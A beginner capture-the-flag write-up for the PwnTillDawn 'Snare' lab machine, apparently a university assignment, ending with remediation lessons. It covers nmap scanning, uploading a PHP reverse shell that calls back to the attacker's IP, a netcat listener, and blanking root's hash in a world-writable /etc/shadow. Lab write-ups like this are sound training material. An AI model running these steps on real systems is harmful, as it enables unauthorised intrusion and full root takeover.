# PwnTillDawn — Snare Machine Writeup

> **Platform:** PwnTillDawn Online Battlefield  
> **Target IP:** `10.150.150.18`  
> **Difficulty:** Beginner  
> **Category:** Web Exploitation · Privilege Escalation  
> **Flags Captured:** 2 / 2 ✅

---

## Table of Contents

1. [Environment Setup — VPN Connection](#1-environment-setup--vpn-connection)
2. [Host Discovery — Network Scan](#2-host-discovery--network-scan)
3. [Target Enumeration — Port Scan](#3-target-enumeration--port-scan)
4. [Web Application Reconnaissance](#4-web-application-reconnaissance)
5. [Exploitation — Web Reverse Shell](#5-exploitation--web-reverse-shell)
6. [Flag 1 — Initial Foothold](#6-flag-1--initial-foothold)
7. [Privilege Escalation — /etc/shadow Edit](#7-privilege-escalation--etcshadow-edit)
8. [Flag 2 — Root Access](#8-flag-2--root-access)
9. [Tools Used](#tools-used)
10. [Lessons Learned](#lessons-learned)

---

## 1. Environment Setup — VPN Connection

Before connecting to the PwnTillDawn network, download the `.ovpn` configuration file from the platform and connect using OpenVPN.

```bash
sudo openvpn PwnTillDawn.ovpn
```

Wait until you see `Initialization Sequence Completed` in the terminal output — this confirms the VPN tunnel is active and you are inside the PwnTillDawn network range (`10.150.150.0/24`).

![alt text]()
![alt text]()

![VPN Connection](screenshots/224956.png)
![VPN Initialized](screenshots/225024.png)

---

## 2. Host Discovery — Network Scan

With the VPN established, perform a **ping sweep** across the PwnTillDawn IP range to identify live hosts.

```bash
nmap -sn 10.150.150.10-254
```

| Option | Description |
|--------|-------------|
| `-sn`  | Ping scan only — no port scan, just host discovery |

**Result:** 47 live hosts detected. The target machine at `10.150.150.18` was identified.

![Host Discovery](screenshots/230123.png)
![Hosts Found](screenshots/230328.png)

---

## 3. Target Enumeration — Port Scan

Run a detailed service and version scan against the target to identify open ports and running services.

```bash
nmap -sC -sV -v 10.150.150.18 -oN nmap
```

| Option  | Description |
|---------|-------------|
| `-sC`   | Run default NSE scripts |
| `-sV`   | Detect service versions |
| `-v`    | Verbose output |
| `-oN nmap` | Save output to a file named `nmap` |

**Results:**

| Port | State | Service |
|------|-------|---------|
| 80   | Open  | HTTP (web server) |

Only **port 80 (HTTP)** is open on this machine.

![Nmap Scan](screenshots/233044.png)
![Nmap Results](screenshots/233347.png)

---

## 4. Web Application Reconnaissance

Open a browser and navigate to the target's web server:

```
http://10.150.150.18
```

Explore the web application to understand its structure and identify any input fields, upload functionality, or file inclusion points that can be leveraged.

![Web Page](screenshots/233404.png)
![Web Exploration](screenshots/233436.png)

---

## 5. Exploitation — Web Reverse Shell

### 5.1 Prepare the Reverse Shell

The web application has a vulnerability that allows uploading or injecting a **PHP web reverse shell**.

Use the **pentestmonkey PHP reverse shell** (available at `/usr/share/webshells/php/php-reverse-shell.php` on Kali Linux).

Edit the shell file to set your attacker IP and port:

```php
$ip = '10.150.150.XXX';   // Your VPN IP
$port = 4444;              // Your listening port
```

![Reverse Shell Config](screenshots/233631.png)

### 5.2 Set Up a Netcat Listener

On your attacking machine, start a netcat listener **before** triggering the shell:

```bash
nc -lvnp 4444
```

| Option | Description |
|--------|-------------|
| `-l`   | Listen mode |
| `-v`   | Verbose |
| `-n`   | No DNS resolution |
| `-p`   | Port number |

![Netcat Listener](screenshots/233707.png)

### 5.3 Upload and Trigger the Shell

Upload the PHP reverse shell through the web application's upload or file inclusion mechanism, then navigate to the uploaded file in your browser to trigger execution.

![Upload Shell](screenshots/234043.png)
![Trigger Shell](screenshots/234202.png)
![Shell Triggered](screenshots/234239.png)

### 5.4 Shell Received

Once the browser accesses the shell file, a reverse connection is established back to your listener.

```
listening on [any] 4444 ...
connect to [10.150.150.XXX] from (UNKNOWN) [10.150.150.18] XXXXX
Linux snare 4.19.0-16-amd64 ...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You now have a shell as `www-data`.

![Shell Connected](screenshots/234337.png)
![Shell Active](screenshots/234354.png)

---

## 6. Flag 1 — Initial Foothold

With the reverse shell active, search for the first flag. The flag hash is retrieved from the file system.

```bash
cat /path/to/flag1
```

> **Flag 1:** `e335462da856f39997bffdc04b8d89ce1104fcc5`

![Flag 1 Found](screenshots/234600.png)
![Flag 1 Hash](screenshots/234659.png)

---

## 7. Privilege Escalation — /etc/shadow Edit

### 7.1 Check for Write Access

Enumerate what writable files or sudo privileges are available to the current `www-data` user.

```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

The `/etc/shadow` file is found to be **world-writable** — a serious misconfiguration.

![Shadow Writable](screenshots/234746.png)
![Shadow Access](screenshots/234855.png)

### 7.2 Read the Shadow File

```bash
vim /etc/shadow
```

Copy the top two lines (root and the next user) into a notepad for reference.

The root line will look similar to:

```
root:$6$<hash>:18586:0:99999:7:::
```

![Shadow File](screenshots/234942.png)

### 7.3 Remove the Root Password Hash

In vim, navigate to the root line and **remove the password hash**, leaving the field empty. This effectively sets root's password to blank (no password required).

Using vim commands:
1. Navigate to the root line
2. Delete the hash field using `dd` and replace with the blank-password format
3. The modified line should look like:

```
root::18586:0:99999:7:::
```

> **Vim tip:** Use `0` to go to start of line, delete to the next `:` and paste your modified line.

```vim
# After editing, save and quit:
:wq!
```

![Vim Edit](screenshots/235655.png)
![Save Shadow](screenshots/235750.png)

### 7.4 Switch to Root

Now switch to root using the blank password:

```bash
su root
# Press Enter when prompted for password (blank)
```

![Su Root](screenshots/000339.png)
![Root Shell](screenshots/000541.png)

Confirm root access:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

![Root Confirmed](screenshots/000644.png)

---

## 8. Flag 2 — Root Access

With root privileges, navigate to the root home directory and retrieve the second flag.

```bash
cat /root/flag.txt
# or check common flag locations
find / -name "flag*" 2>/dev/null
```

> **Flag 2:** `2b0286a69b276189afe50517304963e5fa5982d9`

![Flag 2 Found](screenshots/003412.png)
![Flag 2 Hash](screenshots/003636.png)
![Submission](screenshots/003813.png)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **OpenVPN** | Connect to the PwnTillDawn lab network |
| **Nmap** | Host discovery and port/service enumeration |
| **Web Browser** | Web application reconnaissance |
| **PHP Reverse Shell** | Gain initial foothold via web exploitation |
| **Netcat (`nc`)** | Catch the incoming reverse shell connection |
| **Vim** | Edit `/etc/shadow` for privilege escalation |

---

## Lessons Learned

### Vulnerabilities Identified

| # | Vulnerability | Severity | Impact |
|---|---------------|----------|--------|
| 1 | Unrestricted file upload on web application | High | Remote Code Execution |
| 2 | World-writable `/etc/shadow` file | Critical | Full root privilege escalation |

### Key Takeaways

- **File upload validation** must always be enforced server-side — never trust client-side checks alone. File type, extension, and content should all be validated.
- **File system permissions** must be hardened. `/etc/shadow` should only be readable by root (`chmod 640 /etc/shadow`). World-writable system files are a critical misconfiguration.
- **Principle of least privilege** — web server processes like `www-data` should operate with minimal permissions, reducing the blast radius of any exploitation.
- **Network segmentation** and monitoring would detect anomalous outbound connections such as reverse shells.

### Attack Chain Summary

```
VPN Access
    │
    ▼
Host Discovery (nmap -sn)
    │
    ▼
Port Scan → Port 80 HTTP Open
    │
    ▼
Web App Recon → Upload Vulnerability Found
    │
    ▼
PHP Reverse Shell Uploaded & Triggered
    │
    ▼
Shell as www-data (Flag 1 ✅)
    │
    ▼
/etc/shadow World-Writable → Root Password Removed
    │
    ▼
su root → Root Shell (Flag 2 ✅)
```

---

> *This writeup was produced for educational purposes as part of a university cybersecurity assignment.*
